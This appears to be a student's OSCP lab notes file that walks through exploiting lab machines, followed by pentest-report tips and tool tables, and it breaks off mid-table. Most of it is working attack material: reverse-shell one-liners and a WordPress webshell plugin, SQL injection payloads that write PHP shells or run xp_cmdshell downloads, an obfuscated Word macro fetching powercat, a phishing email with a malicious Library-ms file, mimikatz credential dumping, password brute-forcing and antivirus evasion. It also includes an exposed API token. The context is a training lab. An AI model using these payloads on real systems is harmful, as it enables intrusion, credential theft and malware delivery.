  - **Capstone Lab**: Wordpress vulnerable plugin - Unauthenticated SQL Injection - reverse shell upload
    1. add etc/hosts: alvida-eatery.org
    2. web vulnerability scan
       - `nikto -h http://alvida-eatery.org`
       - `whatweb http://alvida-eatery.org`
       - `gobuster dir -u http://alvida-eatery.org -w /usr/share/wordlists/dirb/common.txt -t5`
       - `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c`
       - **Output: WordPress 6.0, wp-login.php found, [vulnerable plugin - Unauthenticated SQL Injection](https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad (Unauthenticated SQL Injection))**  
    4. login portal disclose user 'admin'
    5. PoC http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users  
    6. Password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (WordPress hash password~hahs.txt)
    7. `john --format=phpass hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`: 'hulabaloo'
    8. Login to wordpress portal   
    9. Create a webshell plugin index.php-->plug.zip (change kali ip, unuse port 4444,8888)
       ```
       <?php
		/**
		* Author: Saeed Bala
		* Plugin Name: PHP Code Plugin
		* Description: Shell Through Plugins
		* Version: 1.0
		*/
		exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.165/8888 0>&1'");
		?>
       ```      
       `zip -r plug.zip index.php`  
    11. `nc -nvlp 8888`
    12. Navigate to http://alvida-eatery.org/wp-admin/plugins.php → Add New → Upload Plugin and upload plug.zip > install > activate plugin
    13. netcat got response and find the flag `find / -name "flag.txt" 2>/dev/null`  
  - **Capstone Lab**: UNION based write shells to server - INTO OUTFILE  
    1. `Capture POST request of "subscribe" function in website  
    2. `sqlmap -r post.txt -p mail-list --batch --level=5 --risk=3 --dump`  
    3. `mail-list=hello@gmail.com' UNION SELECT null, null, null, null, "<?php system($_GET['cmd']);?>", null INTO OUTFILE '/var/www/html/shell.php' #`  
    4. `http://192.168.169.48/shell.php?cmd=cat%20/var/www/flag.txt`  
  - **Capstone Lab**: TIME based xp_cmdshell mssql  
    sql probe: `'; IF (SELECT SUBSTRING(@@version,1,1)) = 'M' WAITFOR DELAY '0:0:3'--`  
    1. start a web server to host nc64.exe  
       download nc64.exe from https://github.com/int0x33/nc.exe/blob/master/nc64.exe  
       `sudo mv nc64.exe /var/www/html/`
       `sudo python3 -m http.server 80`
       `nc -lvnp 4444`
    3. Inject via SQLi (download netcat)  
       `';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.165/nc64.exe c:/windows/temp/nc64.exe";--`  
    5. Inject to trigger reverse shell  
       `'; EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe 192.168.45.165 4444 -e C:\Windows\System32\cmd.exe";--`
    4. `C:\Windows\system32> where /r C:\ flag.txt`  

### Client-site attacks  
- 12.1.1 Information Gathering
  - Metadata of pdf (Author)
    `wget http://192.168.203.197/old.pdf`
    `exiftool -a -u old.pdf`
  - Find pdf of webserver
    `gobuster dir -u http://192.168.203.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf`
- 12.2.3. Leveraging Microsoft Word Macros
  `xfreerdp3 /u:offsec /p:lab /v:192.168.203.196`
  Save "MyMacro" as doc file. View Macro  
    
  ```
  Use powershell OneLiner to base64-encode
  $command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.203.196/powercat.ps1');powercat -c 192.168.203.196 -p 4444 -e powershell"
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  $encodedCommand

  nano splitstring.py
  `str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAzAC4AMQA5ADYALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4AMgAwADMALgAxADkANgAgAC0AcAAgADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="`

  n = 50

  for i in range(0, len(str), n):
	  print("Str = Str + " + '"' + str[i:i+n] + '"')

  python3 ./splitstring.py
  ```

  ```
  Sub AutoOpen()
       MyMacro
  End Sub
    
  Sub Document_Open()
      MyMacro
  End Sub
    
  Sub MyMacro()
      Dim Str As String
        
      Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
          Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
          Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
       ...
          Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
          Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
          Str = Str + "A== "
    
      CreateObject("Wscript.Shell").Run Str
  End Sub
  ```

  ```
  cd /usr/share/powershell-empire/empire/server/data/module_source/management/
  python3 -m http.server 80
  nc -nvlp 4444
  ```
  open the MyMacro doc.

- 12.2.3 capstone lab email phish to send over windows libray files
  - Install and start wsgidav for shared folder  
    ```
    pipx install wsgidav
    mkdir /home/kali/webdav
    /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
    ```
  - Start PowerCat on port 8000  
    `cd usr/…/server/data/module_source/management`  
    `python3 -m http.server 8000`  
  - nc -nvlp 4444  
  - Remote to VM3 to draf windows library files: xfreerdp3 /u:offsec /p:lab /v:192.168.158.194
  - Create New File config.Library-ms in visual studio core
    ```
    <?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://<KALI></url> 
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>
    ```
  - Create .ink shortcut file and save as "automatic_configuration"  
    `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 4444 -e powershell"`  
  - Copy automatic_configuration.lnk, config.Library-ms to the "execute config" folder  
  - Enumerate target web server  
    ```
    gobuster dir -u http://192.168.158.199/ -w /usr/share/wordlists/dirb/common.txt -x pdf
    wget http://192.168.158.199/info.pdf
    exiftool -a -u info.pdf
    Author: Dave Wizard
    ```
  - Open PDF, get the email recipient and credentials (test@supermagicorg.com, test)
  - email phishing attack (target IP)  
    `sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.158.199 --body @body.txt --header "Subject: Problems" --suppress-data`
  - netcat reverse shell received: `gci C:\ -Filter flag.txt -Recurse -ea SilentlyContinue`

### Fixing exploits  
- **Capstone lab**: CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution
  - Modify 44976.py
    ```
    username = "offsec" # change username
    password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ" # change password
    base_url = "http://192.168.171.52/cmsms/admin" # change from "http://192.168.1.10/cmsms/admin"
    ```
  - `python2 44976.py`
  - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`  
- **Capstone lab**: elFinder 2.1.47 - 'PHP connector' Command Injection
  - `gobuster dir -u http://192.168.171.46:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t5`: http://192.168.171.46/seclab/
  - `searchsploit elFinder` [elFinder 2.1.47 - 'PHP connector' Command Injection](https://www.exploit-db.com/exploits/46481)
  - inspect the code
    ```
    url = sys.argv[1]` #expect url param
    payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg
    ```
  - `cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg`  
  - `python2 46481.py http://192.168.171.46/seclab/`  
  - `cat /var/www/http/seclab/php/flag.txt`
- **Capstone lab**: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
  - `nmap -sVC -p- -v -T4 -sT --open 192.168.171.213`: 20000/tcp open  http  Easy Chat Server httpd 1.0
  - `searchsploit Easy Chat Server`: [Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)](https://www.exploit-db.com/exploits/50999)  
  - Generate shellcode  
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`： original one not working with netcat listener as meterpreter using
    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f python -b "\x00\x20" -v shellcode`  
  - Modify shellcode
    ```
    shellcode = b"\x90" * 16
    shellcode += b"\xbe\xb6\x52\x38\xbc\xda\xc1\xd9\x74\x24\xf4"
    ...

    buffer += b"Host: 192.168.171.213:20000\r\n"   #target ip+port
    buffer += b"Referer: http://192.168.171.213\r\n"
    ```
  - Start netcat listener: `nc -lvnp 443`
  - Exploit `python2 easychat_50999.py 192.168.171.213 20000`
  - type C:\Users\Administrator\Desktop\flag.txt

### Locating public exploits   
- mouse server - [WiFi Mouse 1.7.8.5 - Remote Code Execution](https://www.exploit-db.com/exploits/50972)
  - connect to SMB download folders to get hints
    ```
    smbclient \\\\192.168.171.10\\Users -N : Connect to the Users share anonymously
    smb: \offsec\Downloads\> ls
    MouseServer.exe 
    ```
  - `searchsploit "mouse server"`: windows/remote/50972.py 
  - generate windows reverse shell payload
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o shell64.exe`
  - `python3 -m http.server 80`
  - `nc -lvnp 443`
  - `python3 mouseserver_50972.py 192.168.171.10 192.168.45.165 shell64.exe`  
- Apache httpd 2.4.49 -  [Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50383)
  - `searchsploit "Apache 2.4.49"`: multiple/webapps/50383.sh
  - `./apache_2449_50383.sh targets.txt /bin/sh "bash -c 'bash -i >& /dev/tcp/192.168.45.165/4444 0>&1'"`
- JAMES Remote Admin 2.3.2 - [Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50347)
  - `ssh -p 32826 student@192.168.170.52`  
  - `searchsploit "JAMES Remote 2.3.2"`: linux/remote/50347.py  
  - change the port of “James Remote Administration Tool”， “SMTP” in 50347.py  
  - `python3 JAMESAdmin232_50347.py 192.168.170.52 192.168.45.165 443`  

### Password Attacks  
- 15.1 Attacking network services login  
  - **SSH** guess password
    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`  
    `ssh -p 2222 george@192.168.157.201`  
  - **RDP** guess user and export flag to local
    `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`
    `mkdir -p ~/share`: create shared folder
    `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/share`: login to RDP and export flag to local
  - **ftp** guess password
    `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
    `ftp itadmin@192.168.160.202`
    `get flag.txt`
  - HTTP POST Login Form
    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password"`
  - HTTP GET basic authen
    `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.157.201 http-get /`
- 15.2 Password cracking
  - MD5 hash "056df33e47082c77148dba529212d50a" + rule "1@3$5" + rockyou.txt
    `cat demo.rule: $1 $@ $3 $$ $5`  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo4.rule --force`  
  - MD5 hash "19adc0e8921336d08502c039dc297ff8" + rule all letters upper case
    `cat demo5.rule: u d`  `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo5.rule --force`  
  - Dictionary attack with user 'nadine'
    `hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.161.227`
    ```
    ##User's machine copy kbdx to kali
    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

    ##kali
    keepass2john Database.kdbx > keepass.hash
    cat keepass.hash`  remove the "Database"
    hashcat --help | grep -i "KeePass"
    hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  
    ```
  - SSH passphrase for user 'alfred'
    - `searchsploit "Apache 2.4.49"` > HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
    - `curl --path-as-is http://192.168.161.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa -o id_rsa`  
    - crack password by using john: Superstar137!  
      ```
      nano ssh.rule
      [List.Rules:sshRules]
      c $1 $3 $7 $!  
      c $1 $3 $7 $@  
      c $1 $3 $7 $#  
      
      ssh2john id_rsa > ssh.hash
      hashcat -h | grep -i "ssh"
      hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
      sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'
      john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
      ```
   - ssh with the cracked passphrase
     ```
     rm ~/.ssh/known_hosts
     chmod 600 id_rsa
     ssh -i id_rsa -p 2223 alfred@192.168.161.201
     ```
- 15.3 Password hashed
  - Cracking NTLM
    - `xfreerdp3 /u:nadine /p:123abc /v:192.168.139.227 /cert:ignore /drive:share,/home/kali/share`
    - Run powershell as admin `.\mimikatz.exe`
    - dump the hash
      ```
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - Crack the hash in kali
      ```
      nano steve.hash 
      hashcat --help | grep -i "ntlm" > 1000 | NTLM | Operating System
      hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
      ```
  - Passing NTLM (refer note)
  - Cracking Net-NTLMv2 via web app upload
    - sudo responder -I tun0  
    - Burp suite - file upload > change file name > \\\\192.168.45.181\\test > listener captured NTLMv2 hash  
    - Kali `nano sam.hash`  
    - `hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force` > DISISMYPASSWORD  
  - Relaying Net-NTLMv2 via web
    - Starting ntlmrelayx for a Relay-attack targeting FILES02
      ```
      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.181",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText
      ```
    - start netcat listener `nc -nvlp 8080`
    - Using the dir command to create an SMB connection to our Kali machine
      `dir \\192.168.45.181\test` in web portal os command  

### Antivirus Evasion  
- **Capstone Lab**: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
  - install Veil framework
    ```
    sudo apt -y install veil
    /usr/share/veil/config/setup.sh --force --silent
    ```
  - geneate bat file via Veil
    ```
    sudo veil
    Veil>: use 1
    list
    Veil/Evasion>: use 22
    set LHOST 192.168.45.220
    generate
    Please enter the base name for output files (default is payload): configuration-file
    exit
    
    cp /var/lib/veil/output/source/configuration-file.bat .
    ```
  - Another terminal run meterpreter listener
    `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
  - transfer file to ftp as anonymous
    ```
    ftp -a -A 192.168.104.53
    ftp> bin
    ftp> put configuration-file.bat
    ```

### Windows Privilege Escalation  
- 17.1.2 Situation Awareness
  `nc 192.168.139.220 4444` `whoami` `Get-LocalUser`  `Get-LocalGroup` `Get-Content -Path .\LocalUsersGroups.csv`  
  - Display member for group "Remote Management Users"  
    `Get-LocalGroupMember "Remote Management Users"`
  - List installed apps
    ```
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 
    ```
  - another member of local admin group  
    `Get-LocalGroupMember "Administrators"`
  - List the process and file path  
    `Get-Process`  `(Get-Process -Id 2552).MainModule.FileName`
- 17.1.3 Hidden in Plain view
  - Find the flag on the desktop of backupadmin
    ```
    nc 192.168.145.220 4444
    runas /user:backupadmin cmd
    Get-ChildItem -Path C:\Users\backupadmin\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
    type C:\Users\backupadmin\Desktop\flag.txt
    ```
  - Search the file system in user's directory  
    `Get-ChildItem -Path C:\Users\steve -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`  
  - Decode base64 ini file
    ```
    runas /user:richmond cmd
    Get-ChildItem -Path C:\Users\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
    type C:\Users\Public\Documents\install.ini

    Decode it [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ewANAAoAIAAgACIAYgBvAG8AbABlAGEAbgAiADoAIAB0AHIAdQBlACwADQAKACAAIAAiAGEAZABtAGkAbgAiADoAIABmAGEAbABzAGUALAANAAoAIAAgACIAdQBzAGUAcgAiADoAI    AB7AA0ACgAgACAAIAAgACIAbgBhAG0AZQAiADoAIAAiAHIAaQBjAGgAbQBvAG4AZAAiACwADQAKACAAIAAgACAAIgBwAGEAcwBzACIAOgAgACIARwBvAHQAaABpAGMATABpAGYAZQBTAHQAeQBsAGUAMQAzADMANwAhACIADQAKACAAIAB9AA0ACgB9AA=='))
    ```
- 17.1.4 Information Goldmine PowerShell
  - Q1 obtain an interactive shell as daveadmin and find the flag  
    `evil-winrm -i 192.168.145.220 -u daveadmin -p "qwertqwertqwert123\!\!"`  
  - Q2 connect daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging  
    Event Viewer-->Application and Services → Microsoft → Windows → PowerShell → Operational:  
    Click Filter Current Log and search for 4104 event  
  - Q3 connect mac via RDP. Enumerate the machine  
    ```
    Get-History
    (Get-PSReadlineOption).HistorySavePath
    type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```
- 17.1.5 Automated Enumeration
  - WinPEAS enumeration
    `cp /usr/share/peass/winpeas/winPEASx64.exe .`
    `python3 -m http.server 80`

    ```
    nc 192.168.145.220 4444
    powershell
    iwr -uri http://192.168.45.221/winPEASx64.exe -Outfile winPEAS.exe
    .\winpeas.exe 
    ```
  - Seatbelt enumeration
    Download https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe
    `python3 -m http.server 80`

    ```
    nc 192.168.145.220 4444
    powershell
    iwr -uri http://192.168.45.221/Seatbelt.exe -Outfile Seatbelt.exe
    .\Seatbelt.exe -group=all
    ```
- dd

## Penetration testing report 
- note editor:
  - [Sublime-syntax highlight](https://www.sublimetext.com/download)
  - [CherryTree Kali](https://github.com/giuspen/cherrytree)
  - [Obsidian-markdown editor](https://obsidian.md/)
- taking screenshots:
  - snipping tool （win:win+shift+S. Linux:shift+print screen)
  - [flameshot](https://github.com/flameshot-org/flameshot)
- penetration testing notes: application name, URL, request type, issue detail, proof of concept payload  
- effective penetration testing report
  - purpose: highlights all the present flaws, remediation, scope
  - tailor for audience:  
    - **c-suite**: scope + timeframeout, rules of engagement + methodology + executive summary (impact/work-case scenario, trends, strategic advise)  
     **--engagement**    
     The Client hired OffSec to conduct a penetration test of their kali.org web application in October of 2025. The test was conducted from a remote IP between the hours of 9 AM and 5 PM, with no users provided by the Client."  
     **--positives**    
     The application had many forms of hardening in place. First, OffSec was unable toupload malicious files due to the strong filteringin place. OffSec was also unable to brute force user accountsbecause of the robust lockout policy in place. Finally, the strongpassword policy made trivial password attacks unlikely to succeed.This points to a commendable culture of user account protections    
     **--vulnerabilities**    
     However, there were still areas of concern within the application.OffSec was able to inject arbitrary JavaScript into the browser ofan unwitting victim that would then be run in the context of thatvictim. In conjunction with the username enumeration on the loginfield, there seems to be a trend of unsanitized user input compoundedby verbose error messages being returned to the user. This can leadto some impactful issues, such as password or session stealing. It isrecommended that all input and error messages that are returned to theuser be sanitized and made generic to prevent this class of issue fromcropping up.  
     **--conclusion**    
     These vulnerabilities and their remediations are described in moredetail below. Should any questions arise, OffSec is happyto provide further advice and remediation help
    - **technical staff/summary**: technical detail + impact + remediation    
      - User and Privilege Management
      - Architecture
      - Authorization
      - Patch Management
      - Integrity and Signatures
      - Authentication
      - Access Control
      - Audit, Log Management and Monitoring
      - Traffic and Data Encryption
      - Security Misconfigurations
       
     Patch Management  
     Windows and Ubuntu operating systems that are not up to date wereidentified. These are shown to be vulnerable to publicly-availableexploits and could result in malicious execution of code, theftof sensitive information, or cause denial of services which        mayimpact the infrastructure. Using outdated applications increases thepossibility of an intruder gaining unauthorized access by exploitingknown vulnerabilities. Patch management ought to be improved andupdates should be applied in conjunction with change      management.
    - **technical findings and recommendation** (what vulnerability is + why dangerous + outcome + steps to exploit)  

      <img src="https://github.com/xasyhack/oscp2025/blob/main/images/Table%202%20-%20Findings%20and%20Recommendations.png" alt="Alt text" width="400"/>
      
      affected URL/endpoint + method of triggering the vulnerability  
    - **appendices**: articles, reference

## Penetration testing stages
1. scope: IP range, hosts, applications
1. info gathering (passive or active): org infra, assets, personnel
1. vulnerability detection
1. initial foothold
1. privilege escalation
1. lateral movement
1. report
1. remediation

## Recommended OSCP Cracking Tools & Usage (2025)
| Tool              | Purpose                                  | Sample Command | Info / Output |
|------------------|------------------------------------------|----------------|----------------|
| **nmap**          | Port scan, service/version detection      | `nmap -sC -sV -oN scan.txt 10.10.10.10` | Shows open ports, services, versions, default scripts |
| **AutoRecon**     | Automated enumeration pipeline            | `autorecon 10.10.10.10` | Organizes scans, runs Nmap, Gobuster, LinPEAS automatically |
| **Gobuster**      | Web directory brute-force                 | `gobuster dir -u http://target -w common.txt` | Lists hidden directories or files |
| **Feroxbuster**   | Recursive web content discovery           | `feroxbuster -u http://target -w wordlist.txt` | Recursively finds directories/files |
| **FFUF**          | Fast web fuzzing                          | `ffuf -u http://target/FUZZ -w wordlist.txt` | Reveals valid endpoints via response codes |
| **WFuzz**         | Web input fuzzing                         | `wfuzz -c -z file,rockyou.txt --hc 404 http://target/FUZZ` | Discovers fuzzable parameters, paths |
| **Nikto**         | Web server vulnerability scanner          | `nikto -h http://target` | Lists known issues in web server setup |
| **Burp Suite**    | Manual/intercept web testing              | GUI Tool       | Captures/fuzzes requests, intercepts traffic |
| **Hydra**         | Brute-force remote logins                 | `hydra -l admin -P rockyou.txt ssh://10.10.10.10` | Cracks login credentials |
| **John the Ripper** | Offline hash cracking                   | `john hash.txt --wordlist=rockyou.txt` | Cracked hash output |
| **Hashcat**       | GPU-based hash cracking                   | `hashcat -m 1000 hash.txt rockyou.txt` | Fast crack of NTLM or other hashes |
| **wget**          | Download files                            | `wget http://10.10.10.10/file.sh` | Saves remote file locally |
| **curl**          | File transfer / request testing           | `curl -O http://10.10.10.10/file.sh` | Displays or downloads response |
| **ncat** (netcat) | File transfer, bind/reverse shell         | `ncat -lvnp 4444` / `ncat -e /bin/bash attacker 4444` | Listener or shell |
| **ssh**           | Remote login via SSH                      | `ssh user@10.10.10.10` | Secure shell access |
| **python**        | Simple webserver, reverse shell, etc.     | `python3 -m http.server` or `python -c 'reverse shell'` | Serve payloads or pop shells |
| **Impacket**      | Remote access tools (SMB/RPC)             | `wmiexec.py user:pass@10.10.10.10` | Remote shell, file transfer, SID enumeration |
| **CrackMapExec**  | SMB tool + post-exploitation              | `cme smb 10.10.10.10 -u user -p pass` | Check share access, dump hashes, validate creds |
| **Responder**     | LLMNR/NetBIOS poisoning                   | `responder -I eth0` | Captures NTLMv2 hashes |
| **LinPEAS**       | Linux privilege escalation script         | `./linpeas.sh` | Highlights privesc vectors in color |
| **WinPEAS**       | Windows privilege escalation script       | `winPEASx64.exe` | Checks for service misconfigs, ACLs, registry abuse |
| **Chisel**        | Tunneling over HTTP                       | `chisel server -p 9001` / `chisel client attacker:9001 R:localhost:3389` | Pivoting, port forwarding |
| **Mimikatz**      | Credential dumping (Windows)              | `privilege::debug`, `sekurlsa::logonpasswords` | Reveals passwords, hashes, tickets |
| **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
| **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |

## OSCP Pro Tips
- Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
- Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
- After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
- Use **Impacket**, **CME**, or **Chisel** for pivoting.
- Crack hashes using **John**, **Hashcat**, or online resources.

| Tip Category       | Tip |
|--------------------|-----|
| **General Strategy** | Start with **AutoRecon or manual Nmap**, then branch into web (Gobuster/Feroxbuster), SMB (CME/Impacket), or known services. |
| **Time Management** | Spend no more than 1 hour per box if you're stuck. Move on and return later. |
| **Initial Foothold** | Look for unauthenticated pages, exposed SMB/NFS shares, backup files (`.bak`, `.zip`), default creds. |
| **Passwords** | Try **rockyou.txt** and known weak creds. Look for reused passwords across services. |
| **Linux Privesc** | Run `linpeas.sh`, check for SUID binaries, writable `/etc/passwd`, crontabs, misconfigured services. |
| **Windows Privesc** | Use `winPEAS`, `whoami /priv`, and check for AlwaysInstallElevated, weak folder permissions, unquoted service paths. |
| **Reverse Shell Tips** | Use `ncat`, `msfvenom`, or `bash -i >& /dev/tcp` variants. Have multiple listeners ready (4444, 5555). |
| **Pivoting** | Use **Chisel** or **SSH tunnels** to reach internal networks. Don’t overlook second-level escalation. |
| **Reporting** | Take screenshots of each flag, privilege escalation step, and exploit. Label clearly. |
| **Persistence** | If you lose shell, try to re-exploit quickly. Always upload a reverse shell backup (`nc.exe`, `bash shell`, etc.). |
| **VPN Stability** | If VPN disconnects, your *target machines will reset*. Save all notes **locally** in case of resets. |
| **Proof Files** | Submit `proof.txt` and `local.txt` for each rooted box. These are essential for point calculation. |
| **Mental Game** | Stay calm. 3 roots + 1 user = pass. Don’t panic over one tough box. Maximize your strengths. |

## 🟡 1. Information Gathering / Recon
| Tool            | Purpose                                | Sample Command |
|-----------------|----------------------------------------|----------------|
| `nmap`          | Port scanning, service/version detect  | `nmap -sC -sV -oN scan.txt 10.10.10.10` |
| `AutoRecon`     | Automated recon pipeline               | `autorecon 10.10.10.10` |
| `whatweb`       | Detect web technologies                | `whatweb http://target` |
| `gobuster`      | Web dir brute-force                    | `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt` |
| `feroxbuster`   | Recursive web discovery                | `feroxbuster -u http://target -w wordlist.txt` |
| `ffuf`          | Web fuzzing                            | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| `nikto`         | Web vulnerability scanner              | `nikto -h http://target` |
| `whatweb`       | Identify web frameworks                 | `whatweb http://target` |
| `theHarvester`  | Email, domain, subdomain harvesting    | `theharvester -d target.com -b google` |
| `amass`         | Subdomain enumeration                  | `amass enum -d target.com` |

## 🔵 2. Enumeration
| Tool             | Purpose                                 | Sample Command |
|------------------|-----------------------------------------|----------------|
| `enum4linux-ng`  | Enumerate Windows shares, users         | `enum4linux-ng -A 10.10.10.10` |
| `crackmapexec`   | SMB, RDP, WinRM share/user checks       | `cme smb 10.10.10.10 -u user -p pass` |
| `smbclient`      | Access SMB shares                       | `smbclient //10.10.10.10/share` |
| `ldapsearch`     | Query LDAP directory                    | `ldapsearch -x -h 10.10.10.10 -b "dc=example,dc=com"` |
| `snmpwalk`       | SNMP device enumeration                 | `snmpwalk -v2c -c public 10.10.10.10` |
| `sqlmap`         | Automated SQLi and DB dump              | `sqlmap -u "http://target?id=1" --dbs` |
| `wfuzz`          | Web fuzzing                             | `wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ` |
| `impacket-samrdump` | SAMR info enumeration                | `samrdump.py 10.10.10.10` |

## 🟢 3. Gaining Access (Exploitation)

| Tool           | Purpose                                  | Sample Command |
